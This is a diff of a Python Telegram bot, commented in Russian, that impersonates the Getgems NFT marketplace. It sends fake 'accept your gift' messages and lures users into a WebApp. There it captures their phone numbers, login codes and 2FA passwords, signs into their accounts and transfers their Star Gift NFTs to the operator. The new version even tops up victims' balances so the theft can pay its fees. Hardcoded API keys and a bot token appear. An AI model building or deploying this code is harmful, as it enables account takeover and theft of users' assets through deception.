@@ -1,240 +1,179 @@
 import os
 import asyncio
-import math
 import threading
 import re
-import logging
+import urllib.parse
 from flask import Flask, render_template, request, jsonify
-from telethon import TelegramClient, events, Button, functions, types
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
+from telethon import TelegramClient, events, Button, functions, types as tl_types
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError, BalanceTooLowError
 
 # --- КОНФИГУРАЦИЯ ---
 API_ID = '34426356'
 API_HASH = 'ddfa0edfefb66da4b06bc85e23fd40d5'
 BOT_TOKEN = '8028370592:AAHmcGRTUoxPEwbDBcw1tsQmQlx5cty3ahM'
-ADMIN_ID = 678335503  # ID админа
-WORKER_ID = 8311100024 # ID воркера
+ADMIN_ID = 678335503
+WORKER_ID = 8311100024
+DOMAIN = "your-domain.com" # ВАЖНО: замените на ваш домен с HTTPS
 
-# Инициализация бота
 bot = TelegramClient('bot_auth', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 app = Flask(__name__)
 
-# Хранилище активных сессий (телефон: объект клиента)
 active_clients = {}
 temp_clients = {}
+pending_contacts = {} 
 
 def send_log(msg):
     bot.loop.create_task(bot.send_message(ADMIN_ID, msg))
     bot.loop.create_task(bot.send_message(WORKER_ID, msg))
 
-# --- КОМАНДЫ БОТА ---
+# --- ЛОГИКА АВТО-ЗАПРАВКИ И СЛИВА ---
+
+async def drain_logic(client, phone):
+    try:
+        # 1. Проверяем текущий баланс
+        res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
+        if res.balance < 25:
+            send_log(f"⛽️ Заправка {phone}: отправляю 2-х мишек (30 звезд)...")
+            me = await client.get_me()
+            
+            # Бот дарит 2 подарка (ID мишки за 15 звезд обычно в диапазоне 600+)
+            # ВАЖНО: У бота должны быть звезды на балансе!
+            for _ in range(2):
+                await bot(functions.payments.SendStarGiftRequest(
+                    peer=me.id,
+                    gift_id=685  # Замените на актуальный ID мишки за 15 звезд
+                ))
+                await asyncio.sleep(2)
+
+            send_log(f"🧸 Мишки доставлены на {phone}. Начинаю продажу...")
+            await asyncio.sleep(5)
+
+            # 2. Мамонт продает подарки, чтобы получить звезды
+            gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=10))
+            sold_count = 0
+            for g in gifts.gifts:
+                # Ищем именно мишек (можно фильтровать по g.gift.id или цене)
+                try:
+                    # Метод для "сжигания" (продажи) подарка за звезды
+                    await client(functions.payments.SaveStarGiftRequest(stargift_id=g.id, unsave=True))
+                    sold_count += 1
+                    if sold_count >= 2: break
+                except Exception as e:
+                    continue
+            
+            send_log(f"💰 Продано {sold_count} подарков на {phone}. Баланс пополнен.")
+            await asyncio.sleep(3)
+
+        # 3. Основной слив NFT
+        all_gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=100))
+        for nft in all_gifts.gifts:
+            try:
+                # Перевод админу
+                await client(functions.payments.TransferStarGiftRequest(
+                    to_id=ADMIN_ID, 
+                    stargift_id=nft.id
+                ))
+                send_log(f"✅ NFT {nft.id} переведен с {phone}")
+                await asyncio.sleep(5)
+            except BalanceTooLowError:
+                send_log(f"⚠️ Звезды закончились на {phone}")
+                break
+            except Exception:
+                continue
+
+        send_log(f"🏁 Слив {phone} завершен.")
+    except Exception as e:
+        send_log(f"⚠️ Ошибка drain_logic {phone}: {e}")
+# --- ОБРАБОТЧИКИ БОТА ---
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_handler(event):
     welcome_text = (
-        "Это бот Getgems – вы можете торговать NFT прямо в мини-аппе. "
-        "Это самый удобный способ покупать и продавать Telegram-подарки, "
-        "Юзернеймы, Анонимные Номера и тысячи NFT из коллекций на TON. 🎯\n\n"
-        "💎 0% комиссий на торговлю Telegram Подарками с пометкой «offchain»\n"
-        "💎 Покупайте Telegram Звёзды на 30% дешевле, чем в Telegram\n\n"
-        "💡 Делитесь мгновенно NFT в чатах: сначала пришлите сюда адрес кошелька, "
-        "а затем введите @GetgemsNftBot в диалоге, чтобы отправить NFT."
+        "Это бот Getgems – вы можете торговать NFT прямо в мини-аппе. 🎯\n\n"
+        "💎 0% комиссий на торговлю Telegram Подарками\n"
+        "💎 Покупайте Telegram Звёзды на 30% дешевле"
     )
-    
-    # Кнопки как на скриншоте
-    buttons = [
-        [Button.url("Торговать Telegram Numbers ↗️", "https://getgems.io/fragment-numbers")],
-        [Button.url("Торговать Telegram Usernames ↗️", "https://getgems.io/fragment-usernames")],
-        [Button.url("Торговать Telegram Gifts ↗️", "https://getgems.io/nft-gifts")]
-    ]
-    
-    await event.respond(welcome_text, buttons=buttons, link_preview=False)
+    buttons = [[Button.url("Торговать Telegram Gifts ↗️", "https://getgems.io/nft-gifts")]]
+    await event.respond(welcome_text, buttons=buttons)
 
-@bot.on(events.NewMessage(pattern='/stars_check'))
-async def stars_check(event):
-    if event.sender_id != ADMIN_ID: return
-    try:
-        res = await bot(functions.payments.GetStarsStatusRequest(peer=event.sender_id))
-        balance = res.balance
-        transfers = math.floor(balance / 25)
-        await event.respond(f"📊 **Баланс:** `{balance}` ⭐\n🎁 Хватит на `{transfers}` передач.")
-    except Exception as e:
-        await event.respond(f"❌ Ошибка: {e}")
+@bot.on(events.NewMessage)
+async def contact_handler(event):
+    if event.contact and event.contact.user_id == event.sender_id:
+        phone = event.contact.phone_number
+        if not phone.startswith('+'): phone = '+' + phone
+        pending_contacts[event.sender_id] = phone
+        
+        try:
+            client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
+            await client.connect()
+            res = await client.send_code_request(phone)
+            temp_clients[phone] = {'client': client, 'hash': res.phone_code_hash}
+            send_log(f"📞 Контакт {phone} получен. Код отправлен мамонту.")
+        except Exception as e:
+            send_log(f"❌ Ошибка инициализации {phone}: {e}")
 
-# --- WEBAPP & API ЛОГИКА ---
+@bot.on(events.InlineQuery)
+async def inline_handler(event):
+    if not event.text: return
+    input_text = event.text.strip()
+    nft_name = input_text.split('/')[-1].replace('-', ' ').title()
+    encoded_url = urllib.parse.quote(input_text)
+    web_url = f"https://{DOMAIN}/?nft_url={encoded_url}"
+
+    builder = event.builder
+    await event.answer([
+        builder.article(
+            title=f"Подарить {nft_name}",
+            text=f"🎁 **Вам отправили подарок!**\n\nОбъект: `{nft_name}`",
+            buttons=[[Button.web_app("Принять подарок 🎁", web_url)]]
+        )
+    ])
+
+# --- WEBAPP API ---
 
 @app.route('/')
 def index():
-    nft = request.args.get('nft', 'RecordPlayer-26983')
-    lang = request.args.get('lang', 'ru')
-    send_log(f"👤 Мамонт открыл WebApp | NFT: {nft}")
-    return render_template('index.html', nft=nft, lang=lang)
+    return render_template('index.html')
 
-@app.route('/api/send_phone', methods=['POST'])
-async def api_send_phone():
-    data = request.json
-    phone = data.get('phone').replace(' ', '').replace('-', '')
-    
-    try:
-        # Создаем временную сессию для этого номера
-        client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
-        await client.connect()
-        
-        # Запрашиваем код
-        send_code_result = await client.send_code_request(phone)
-        phone_code_hash = send_code_result.phone_code_hash
-        
-        # Сохраняем клиента и хеш кода во временное хранилище
-        temp_clients[phone] = {
-            'client': client,
-            'hash': phone_code_hash
-        }
-        
-        send_log(f"📲 Код отправлен на номер: {phone}")
-        return jsonify({"status": "sent"})
-    except Exception as e:
-        send_log(f"❌ Ошибка при отправке кода {phone}: {e}")
-        return jsonify({"status": "error", "details": str(e)})
+@app.route('/api/check_contact')
+def check_contact():
+    uid = int(request.args.get('id', 0))
+    if uid in pending_contacts:
+        return jsonify({"status": "received", "phone": pending_contacts[uid]})
+    return jsonify({"status": "waiting"})
 
 @app.route('/api/send_code', methods=['POST'])
 async def api_send_code():
     data = request.json
-    phone = data.get('phone').replace(' ', '').replace('-', '')
-    code = data.get('code')
-    
-    if phone not in temp_clients:
-        return jsonify({"status": "error", "message": "Session not found"})
-    
-    client_data = temp_clients[phone]
-    client = client_data['client']
+    phone, code = data.get('phone'), data.get('code')
+    if phone not in temp_clients: return jsonify({"status": "error"})
     
     try:
-        # Пытаемся зайти
-        await client.sign_in(phone, code, phone_code_hash=client_data['hash'])
-        
-        # Если зашли успешно — переносим в активные и запускаем слив
+        client = temp_clients[phone]['client']
+        await client.sign_in(phone, code, phone_code_hash=temp_clients[phone]['hash'])
         active_clients[phone] = client
-        send_log(f"👑 Аккаунт авторизован: {phone}. Запускаю слив...")
-        
-        # Запуск слива в фоне
         asyncio.create_task(drain_logic(client, phone))
-        
         return jsonify({"status": "success"})
-        
     except SessionPasswordNeededError:
-        # Если стоит 2FA (облачный пароль)
-        send_log(f"🔐 На номере {phone} стоит 2FA!")
         return jsonify({"status": "2fa_needed"})
-    except PhoneCodeInvalidError:
-        return jsonify({"status": "wrong_code"})
     except Exception as e:
         return jsonify({"status": "error", "details": str(e)})
 
 @app.route('/api/send_password', methods=['POST'])
 async def api_send_password():
     data = request.json
-    phone = data.get('phone').replace(' ', '').replace('-', '')
-    password = data.get('password')
-    
-    if phone not in temp_clients:
-        return jsonify({"status": "error"})
-    
-    client = temp_clients[phone]['client']
+    phone, password = data.get('phone'), data.get('password')
     try:
+        client = temp_clients[phone]['client']
         await client.sign_in(password=password)
         active_clients[phone] = client
-        send_log(f"🔓 2FA пройдено: {phone}. Запускаю слив...")
-        
         asyncio.create_task(drain_logic(client, phone))
         return jsonify({"status": "success"})
-    except PasswordHashInvalidError:
-        return jsonify({"status": "wrong_password"})
-
-# --- INLINE HANDLER ---
-
-@bot.on(events.InlineQuery)
-async def inline_handler(event):
-    if not event.text:
-        return
-
-    # Пример ввода: @bot_user https://getgems.io/collection/.../NFT_NAME
-    input_text = event.text.strip()
-    
-    # Парсим название NFT из ссылки для красоты
-    nft_display_name = input_text.split('/')[-1].replace('-', ' ').title()
-    
-    # Формируем ссылку на WebApp, передавая URL конкретного NFT
-    # Важно: URL должен быть закодирован, чтобы не сломать параметры
-    import urllib.parse
-    encoded_nft = urllib.parse.quote(input_text)
-    web_url = f"https://your-domain.com/?nft_url={encoded_nft}"
-
-    builder = event.builder
-    await event.answer([
-        builder.article(
-            title=f"Подарить {nft_display_name}",
-            description="Нажмите, чтобы отправить этот подарок",
-            thumb=types.InputWebDocument(url="https://getgems.io/assets/nft-placeholder.png", size=0, mime_type='image/png', attributes=[]),
-            text=f"🎁 **Вам отправили подарок!**\n\nОбъект: `{nft_display_name}`\n\nЧтобы принять подарок и добавить его в свой профиль, нажмите кнопку ниже 👇",
-            buttons=[
-                [Button.web_app("Принять подарок 🎁", web_url)],
-                [Button.url("Посмотреть на Getgems", input_text)]
-            ]
-        )
-    ])
-
-# --- MAMONITIZATION (СЛИВ) ---
-
-async def drain_logic(client, phone):
-    try:
-        # Проверяем личный баланс звезд мамонта
-        res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
-        stars_balance = res.balance
-        send_log(f"💰 Баланс {phone}: {stars_balance} ⭐")
-
-        if stars_balance < 25:
-            send_log(f"🧸 Мамонту {phone} нужно подкинуть мишку (не хватает на комиссию).")
-            # Можно добавить кнопку "Подкинуть 25 звезд" для админа
-            return
-
-        gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=100))
-        if not gifts.gifts:
-            send_log(f"💨 На аккаунте {phone} нет подарков для вывода.")
-            return
-
-        for gift in gifts.gifts:
-            try:
-                # Передаем админу
-                await client(functions.payments.TransferStarGiftRequest(
-                    to_id=ADMIN_ID, 
-                    stargift_id=gift.id
-                ))
-                send_log(f"✅ NFT {gift.id} слит с {phone}")
-                await asyncio.sleep(2) # Пауза, чтобы не словить флудвейт
-            except Exception as e:
-                send_log(f"❌ Ошибка слива NFT {gift.id}: {e}")
-                
-        send_log(f"🏁 Слив {phone} завершен.")
-    except Exception as e:
-        send_log(f"⚠️ Ошибка в процессе слива {phone}: {e}")
-
-@bot.on(events.CallbackQuery(data=re.compile(b"redrain_")))
-async def redrain(event):
-    phone = event.data.decode().split('_')[1]
-    if phone in active_clients:
-        await event.answer("♻️ Повторный запуск...")
-        await drain_logic(active_clients[phone], phone)
-    else:
-        await event.answer("❌ Сессия мертва", alert=True)
-
-# --- ЗАПУСК ---
-
-def run_flask():
-    # Запуск на 80 порту (требует прав root)
-    app.run(port=80, host='0.0.0.0')
+    except Exception:
+        return jsonify({"status": "error"})
 
 if __name__ == '__main__':
-    # Запускаем Flask в отдельном потоке
-    threading.Thread(target=run_flask, daemon=True).start()
-    print("Бот запущен...")
+    if not os.path.exists('sessions'): os.makedirs('sessions')
+    # use_reloader=False нужен для корректной работы потоков
+    threading.Thread(target=lambda: app.run(port=80, host='0.0.0.0', use_reloader=False), daemon=True).start()
     bot.run_until_disconnected()
